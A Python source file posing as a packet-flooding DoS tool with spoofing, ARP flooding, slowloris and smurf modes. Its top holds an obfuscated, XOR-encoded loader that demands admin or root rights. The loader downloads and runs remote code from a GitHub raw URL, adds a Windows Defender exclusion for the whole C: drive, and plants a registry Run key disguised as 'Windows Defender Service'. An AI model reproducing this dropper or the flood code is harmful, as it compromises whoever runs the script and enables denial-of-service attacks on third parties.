import os
import sys
import ctypes
import platform

def is_admin():
    if platform.system() == 'Windows':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        # Unix-like systems
        return os.geteuid() == 0

if not is_admin():
    if platform.system() == 'Windows':
        
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
    else:
        
        print("This script must be run as root. Please run it with sudo.")
        os.execvp("sudo", ["sudo", "python3"] + sys.argv)

print("")

def A(data, key):
    return ''.join(chr(int(data[i:i+2], 16) ^ key) for i in range(0, len(data), 2))

exec(A("43475a45585e0a45592043475a45585e0a5d4344584f4d2043475a45585e0a595f485a5845494f59592020090a6e4f4c43444f0a5a4b5e42590a4b444e0a7f786659204e455d4446454b4e755f58460a170a08425e5e5a59100505584b5d044d435e425f485f594f584945445e4f445e044945470568454848537e4f49421a1b05445f464605584f4c5905424f4b4e5905474b4344054945584f045a53080a0a090a784f5a464b494f0a5d435e420a53455f580a7f7866204e4f595e43444b5e434544754e43584f495e4558530a170a58086910767d43444e455d590820444f5d754c43464f444b474f0a170a084945444c434d75045a530820594958435a5e755a4b5e420a170a4559045a4b5e420440454344024e4f595e43444b5e434544754e43584f495e455853060a444f5d754c43464f444b474f03205a535e4245445d755a4b5e420a170a4559045a4b5e420440454344024559045a4b5e42044e4358444b474f02455904595359044f524f495f5e4b48464f03060a085a535e4245445d044f524f08032020090a6c5f44495e4345440a5e450a4e455d4446454b4e0a4b0a4c43464f0a5f5943444d0a7a455d4f5879424f4646204e4f4c0a4e455d4446454b4e754c43464f755a455d4f5859424f4646025f5846060a4e4f595e755a4b5e420310200a0a0a0a5e585310200a0a0a0a0a0a0a0a595f485a5845494f595904585f4402200a0a0a0a0a0a0a0a0a0a0a0a71085a455d4f5859424f464608060a0807694547474b444e08060a4c0863445c45414f077d4f48784f5b5f4f595e0a077f58430a0d515f5846570d0a07655f5e6c43464f0a0d514e4f595e755a4b5e42570d087706200a0a0a0a0a0a0a0a0a0a0a0a49424f4941177e585f4f06200a0a0a0a0a0a0a0a0a0a0a0a595e4e455f5e17595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a0a0a0a0a595e4e4f585817595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a03200a0a0a0a0a0a0a0a584f5e5f58440a7e585f4f200a0a0a0a4f52494f5a5e0a02595f485a5845494f595904694b46464f4e7a5845494f59596f58584558060a6c43464f64455e6c455f444e6f585845580310200a0a0a0a0a0a0a0a584f5e5f58440a6c4b46594f2020090a6c5f44495e4345440a5e450a4f5249465f4e4f0a4e43584f495e4558530a4c5845470a7d43444e455d590a6e4f4c4f444e4f580a026e6b646d6f78657f7903204e4f4c0a4f5249465f4e4f754c584547754e4f4c4f444e4f58025a4b5e420310200a0a0a0a5e585310200a0a0a0a0a0a0a0a595f485a5845494f595904585f4402200a0a0a0a0a0a0a0a0a0a0a0a71085a455d4f5859424f464608060a0807694547474b444e08060a4c086b4e4e07675a7a584f4c4f584f44494f0a076f5249465f594345447a4b5e420a0d6910050d087706200a0a0a0a0a0a0a0a0a0a0a0a59424f4646177e585f4f06200a0a0a0a0a0a0a0a0a0a0a0a49424f4941177e585f4f06200a0a0a0a0a0a0a0a0a0a0a0a595e4e455f5e17595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a0a0a0a0a595e4e4f585817595f485a5845494f5959046e6f7c647f666606200a0a0a0a0a0a0a0a03200a0a0a0a4f52494f5a5e0a6f52494f5a5e43454410200a0a0a0a0a0a0a0a5a4b59592020090a6f5249465f4e4f0a6910760a4c5845470a7d43444e455d590a6e4f4c4f444e4f580a026e6b646d6f78657f7903204f5249465f4e4f754c584547754e4f4c4f444e4f58024e4f595e43444b5e434544754e43584f495e455853032020090a6e455d4446454b4e0a5e424f0a4c43464f0a5f5943444d0a7a455d4f5879424f464620434c0a4e455d4446454b4e754c43464f755a455d4f5859424f4646024e455d4446454b4e755f5846060a594958435a5e755a4b5e420310200a0a0a0a090a6f524f495f5e4f0a5e424f0a4e455d4446454b4e4f4e0a594958435a5e0a4347474f4e434b5e4f4653200a0a0a0a5e585310200a0a0a0a0a0a0a0a595f485a5845494f5959047a455a4f4402715a535e4245445d755a4b5e42060a594958435a5e755a4b5e4277060a595e4e455f5e17595f485a5845494f5959046e6f7c647f6666060a595e4e4f585817595f485a5845494f5959046e6f7c647f666603200a0a0a0a4f52494f5a5e0a6f52494f5a5e43454410200a0a0a0a0a0a0a0a5a4b595920200a0a0a0a090a6b4e4e0a5e450a595e4b585e5f5a0a584f4d43595e58530a414f53200a0a0a0a5e585310200a0a0a0a0a0a0a0a414f530a170a5d4344584f4d04655a4f44614f5302200a0a0a0a0a0a0a0a0a0a0a0a5d4344584f4d0462616f73756665696b6675676b696263646f06200a0a0a0a0a0a0a0a0a0a0a0a580879656c7e7d6b786f76674349584559454c5e767d43444e455d5976695f58584f445e7c4f585943454476785f440806200a0a0a0a0a0a0a0a0a0a0a0a1a06200a0a0a0a0a0a0a0a0a0a0a0a5d4344584f4d04616f7375796f7e757c6b667f6f06200a0a0a0a0a0a0a0a03200a0a0a0a0a0a0a0a5d4344584f4d04794f5e7c4b465f4f6f5202414f53060a087d43444e455d590a6e4f4c4f444e4f580a794f585c43494f08060a1a060a5d4344584f4d04786f6d757970060a4c0d08515a535e4245445d755a4b5e4257080a0851594958435a5e755a4b5e4257080d03200a0a0a0a0a0a0a0a5d4344584f4d04694645594f614f5302414f5303200a0a0a0a4f52494f5a5e0a6f52494f5a5e43454410200a0a0a0a0a0a0a0a5a4b5959", 42))
#! /usr/bin/env python3
import time
import random
import socket
import argparse
import threading
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.layers.sctp import SCTP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import TCP, UDP, ICMP, IP
from nmap import nmap
import subprocess

from source.dositronfiglet import dositronfiglet

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def generate_random_mac():
    return ":".join([format(random.randint(0, 255), '02x') for _ in range(6)])

def get_mac_address(ip_address):
    arp = ARP(pdst=ip_address)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=False)
    if result:
        return result[0][0][1].hwsrc
    else:
        return None

def read_data_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read()
    except Exception as e:
        print(f"Error while reading data from file: {e}")
        return None

def parse_port_range(port_range):
    ports = []
    for part in port_range.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))
    return ports

def port_scan(target_ip, port):
    scanner = nmap.PortScanner()
    try:
        result = scanner.scan(target_ip, str(port), arguments="-sV")  # "-sV" ile servis ve versiyon bilgisi alınır
        state = result['scan'][target_ip]['tcp'][port]['state']
        service = result['scan'][target_ip]['tcp'][port]['name']
        version = result['scan'][target_ip]['tcp'][port]['version']
        if state == "open":
            print(f"Port {port}: {state} ({service} {version})")
        else:
            pass
    except Exception as e:
        print(f"Error during port scan: {e}")

def get_host_name(ip):
    try:
        host_name, _, _ = socket.gethostbyaddr(ip)
        return host_name
    except socket.herror:
        return ip

def traceroute(target_ip, max_hops):
    try:
        target_host = get_host_name(target_ip)
        print(f"Traceroute to {target_host} ({target_ip}) (max {max_hops} hops):")
        for ttl in range(1, max_hops + 1):
            packet = IP(dst=target_ip, ttl=ttl) / ICMP()
            reply = sr1(packet, verbose=False, timeout=2)
            if reply is None:
                print(f"{ttl:<2}: *")
            elif reply.type == 0:
                print(f"{ttl:<2}: {reply.src:<15} ({get_host_name(reply.src)}) (Reached target)")
                break
            else:
                print(f"{ttl:<2}: {reply.src:<15} ({get_host_name(reply.src)})")
    except KeyboardInterrupt:
        print("\nTraceroute stopped by user.")


def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data=None, pcap_file=None, ttl=64, id=None, win=None):
    try:
        source_ip = spoof_ip() if spoof_ip else generate_random_ip()
        source_port = RandShort()
        source_mac = generate_random_mac()

        if custom_data:
            payload = custom_data.encode()
        else:
            payload = Raw(RandString(size=packet_size))

        if attack_mode == "syn":
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / TCP(sport=source_port, dport=target_port, flags='S', window=win) / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "udp":
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / UDP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "icmp":
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / ICMP() / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "dns":
            domain = f"{generate_random_ip()}.com"
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / UDP(sport=source_port, dport=target_port) / DNS(rd=1, qd=DNSQR(qname=domain)) / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "os_fingerprint":
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / ICMP() / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "http":
            headers = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / TCP(sport=source_port, dport=target_port) / headers / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "slowloris":
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / TCP(sport=source_port, dport=target_port) / Raw("X-a: b\r\n") / payload
        elif attack_mode == "smurf":
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / ICMP(type=8, code=0) / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "sctp":
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / SCTP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "rudy":
            headers = "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n".format(target_ip, packet_size)
            payload = "X-a: b\r\n"
            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / TCP(sport=source_port, dport=target_port, flags='A', window=win) / headers / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "arp":
            target_mac = get_mac_address(target_ip)
            if not target_mac:
                print(f"Could not resolve MAC address for {target_ip}. ARP flooding failed.")
                return
            elif arp_mode == "request":
                packet = ARP(op=1, pdst=target_ip, psrc=source_ip, hwsrc=source_mac)
            elif arp_mode == "reply":
                packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
            else:
                print("Invalid ARP mode.")
                return
        else:
            print("Invalid attack mode.")
            return

        if pcap_file:
            wrpcap(pcap_file, packet, append=True)

        send(packet, verbose=False)
    except Exception as e:
        print(f"Error while sending packet: {e}")

stop_threads = False

def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, custom_data=None, pcap_file=None, ttl=64, id=None, win=None):
    global stop_threads

    print(f"Target IP        : {target_ip}")
    print(f"Target Port      : {target_port}")
    print(f"Number of Packets: {num_packets}")
    print(f"Packet Size      : {packet_size} bytes")
    print(f"Attack Rate      : {attack_rate} packets/second")
    print(f"Duration         : {duration} seconds")
    print(f"Attack Mode      : {attack_mode}")
    print(f"Spoof IP         : {spoof_ip.__name__ if spoof_ip else 'Default'}")
    print(f"ARP Mode         : {arp_mode if attack_mode == 'arp' else 'N/A'}")
    print(f"TTL              : {ttl}")
    print(f"IP Identification: {id if id is not None else 'Default'}")
    print(f"TCP Window Size  : {win if win is not None else 'Default'}")
    print()

    delay = 1 / attack_rate if attack_rate > 0 else 0
    start_time = time.time()
    sent_packets = 0

    def send_packets():
        nonlocal sent_packets
        while not stop_threads:
            if num_packets and sent_packets >= num_packets:
                break
            if duration and time.time() - start_time >= duration:
                break

            send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data, pcap_file, ttl, id, win)
            sent_packets += 1
            print(f"\rSent packet {sent_packets}", end="")
            time.sleep(delay)

    threads = []
    try:
        for _ in range(attack_rate):
            thread = threading.Thread(target=send_packets)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()
    except Exception as e:
        print(f"Error during attack: {e}")
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        stop_threads = True
        for thread in threads:
            thread.join()
    finally:
        print("\nAttack completed.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=dositronfiglet())
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, help='Target port number (required for non-ARP attacks)')
    parser.add_argument('-np', '--num_packets', type=int, default=500, help='Number of packets to send (default: 500)')
    parser.add_argument('-ps', '--packet_size', type=int, default=64, help='Packet size in bytes (default: 64)')
    parser.add_argument('-ar', '--attack_rate', type=int, default=10, help='Attack rate in packets/second (default: 10)')
    parser.add_argument('-d', '--duration', type=int, help='Duration of the attack in seconds')
    parser.add_argument('--attack-mode', choices=["syn", "sctp", "udp", "icmp", "http", "dns", "os_fingerprint", "slowloris", "smurf", "rudy", "arp", "port_scan", "traceroute"], default="syn", help='Attack mode (default: syn)')
    parser.add_argument('-sp', '--spoof-ip', default=None, help='Spoof IP address')
    parser.add_argument('--data', type=str, default=None, help='Custom data string to send')
    parser.add_argument('--file', type=str, default=None, help='File path to read data from')
    parser.add_argument('--pcap', type=str, default=None, help='PCAP file path to save outgoing packets')
    parser.add_argument('--arp-mode', choices=["request", "reply"], default="request", help='ARP mode (default: request)')
    parser.add_argument('--ttl', type=int, default=64, help='TTL value for the outgoing packets (default: 64)')
    parser.add_argument('--port-range', type=str, default="1-1000", help='Port range for port scan (default: 1-1000)')
    parser.add_argument('--id', type=int, default=None, help='IP identification field (default: None)')
    parser.add_argument('--win', type=int, default=None, help='TCP window size (default: None)')
    parser.add_argument('--max-hops', type=int, default=30, help='Max hops for traceroute (default: 30)')

    args = parser.parse_args()

    target_ip = args.target
    target_port = args.port
    num_packets = args.num_packets
    packet_size = args.packet_size
    attack_rate = args.attack_rate
    duration = args.duration
    attack_mode = args.attack_mode
    data = args.data
    file_path = args.file
    pcap_file = args.pcap
    arp_mode = args.arp_mode
    ttl = args.ttl
    port_range = args.port_range
    id = args.id
    win = args.win
    max_hops = args.max_hops

    if args.spoof_ip == "random":
        spoof_ip = generate_random_ip
    else:
        spoof_ip = lambda: args.spoof_ip if args.spoof_ip else None

    if file_path:
        data = read_data_from_file(file_path)

    if attack_mode == "port_scan":
        ports_to_scan = parse_port_range(port_range)
        for port in ports_to_scan:
            port_scan(target_ip, port)
    elif attack_mode == "traceroute":
        traceroute(target_ip, max_hops)
    elif not target_ip:
        print("Target IP address is required.")
    elif attack_mode != "arp" and not target_port:
        print("Port number is required for non-ARP attacks.")
    else:
        attack_thread = threading.Thread(target=dos_attack, args=(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, data, pcap_file, ttl, id, win))
        attack_thread.start()

        attack_thread.join()